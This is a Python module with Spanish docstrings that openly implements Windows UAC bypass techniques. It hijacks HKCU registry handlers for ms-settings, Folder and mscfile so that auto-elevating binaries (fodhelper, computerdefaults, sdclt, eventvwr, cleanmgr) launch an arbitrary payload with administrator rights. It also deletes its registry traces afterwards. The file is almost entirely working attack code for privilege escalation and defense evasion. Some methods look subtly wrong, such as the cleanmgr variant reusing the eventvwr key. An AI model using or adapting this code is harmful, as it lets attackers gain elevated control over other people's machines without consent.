"""
Módulo de UAC Bypass.
Implementa diferentes técnicas para evadir/bypassear UAC en Windows.
"""

import os
import sys
import ctypes
import winreg
import logging
import tempfile
import subprocess
from typing import Dict, Optional, Union
from pathlib import Path

class UACBypass:
    def __init__(self):
        """Inicializa el módulo de UAC Bypass."""
        self.temp_dir = tempfile.mkdtemp()
        self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        self.techniques = {
            "fodhelper": self._fodhelper_bypass,
            "computerdefaults": self._computerdefaults_bypass,
            "sdclt": self._sdclt_bypass,
            "eventvwr": self._eventvwr_bypass,
            "diskcleanup": self._diskcleanup_bypass
        }

    def check_uac_level(self) -> Dict[str, Union[int, str, bool]]:
        """
        Verifica el nivel actual de UAC.
        
        Returns:
            Dict con información sobre la configuración de UAC
        """
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                0,
                winreg.KEY_READ
            )
            
            consent_prompt_behavior = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0]
            prompt_on_secure_desktop = winreg.QueryValueEx(key, "PromptOnSecureDesktop")[0]
            enable_lua = winreg.QueryValueEx(key, "EnableLUA")[0]
            
            uac_level = "Alto"
            if consent_prompt_behavior == 0:
                if prompt_on_secure_desktop == 0:
                    uac_level = "Ninguno"
                else:
                    uac_level = "Bajo"
            
            return {
                "success": True,
                "uac_enabled": bool(enable_lua),
                "consent_behavior": consent_prompt_behavior,
                "secure_desktop": bool(prompt_on_secure_desktop),
                "level": uac_level
            }
            
        except Exception as e:
            logging.error(f"Error verificando nivel UAC: {e}")
            return {"success": False, "error": str(e)}

    def try_bypass(self, technique: str, payload_path: str) -> Dict[str, Union[bool, str]]:
        """
        Intenta realizar un bypass de UAC usando la técnica especificada.
        
        Args:
            technique: Nombre de la técnica a usar
            payload_path: Ruta al ejecutable que queremos elevar
            
        Returns:
            Dict indicando éxito o fracaso
        """
        if self.is_admin:
            return {"success": False, "error": "Ya se tienen privilegios de administrador"}
            
        if technique not in self.techniques:
            return {"success": False, "error": f"Técnica {technique} no implementada"}
            
        try:
            return self.techniques[technique](payload_path)
        except Exception as e:
            logging.error(f"Error en bypass {technique}: {e}")
            return {"success": False, "error": str(e)}

    def _fodhelper_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:
        """Bypass usando fodhelper.exe."""
        try:
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(registry_key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(registry_key, "", 0, winreg.REG_SZ, payload_path)
            
            subprocess.Popen("fodhelper.exe")
            return {"success": True}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass

    def _computerdefaults_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:
        """Bypass usando computerdefaults.exe."""
        try:
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(registry_key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(registry_key, "", 0, winreg.REG_SZ, payload_path)
            
            subprocess.Popen("computerdefaults.exe")
            return {"success": True}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass

    def _sdclt_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:
        """Bypass usando sdclt.exe."""
        try:
            key_path = r"Software\Classes\Folder\shell\open\command"
            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(registry_key, "", 0, winreg.REG_SZ, payload_path)
            
            subprocess.Popen("sdclt.exe")
            return {"success": True}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass

    def _eventvwr_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:
        """Bypass usando eventvwr.exe."""
        try:
            key_path = r"Software\Classes\mscfile\shell\open\command"
            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(registry_key, "", 0, winreg.REG_SZ, payload_path)
            
            subprocess.Popen("eventvwr.exe")
            return {"success": True}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass

    def _diskcleanup_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:
        """Bypass usando cleanmgr.exe."""
        try:
            key_path = r"Software\Classes\mscfile\shell\open\command"
            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(registry_key, "", 0, winreg.REG_SZ, payload_path)
            
            subprocess.Popen("cleanmgr.exe")
            return {"success": True}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass

    def cleanup(self):
        """Limpia archivos temporales y modificaciones del registro."""
        try:
            # Limpiar directorio temporal
            if os.path.exists(self.temp_dir):
                for root, dirs, files in os.walk(self.temp_dir, topdown=False):
                    for name in files:
                        try:
                            os.remove(os.path.join(root, name))
                        except:
                            pass
                    for name in dirs:
                        try:
                            os.rmdir(os.path.join(root, name))
                        except:
                            pass
                try:
                    os.rmdir(self.temp_dir)
                except:
                    pass
            
            # Limpiar claves del registro
            registry_paths = [
                r"Software\Classes\ms-settings\Shell\Open\command",
                r"Software\Classes\Folder\shell\open\command",
                r"Software\Classes\mscfile\shell\open\command"
            ]
            
            for path in registry_paths:
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
                except:
                    continue
                    
        except Exception as e:
            logging.error(f"Error en limpieza: {e}")
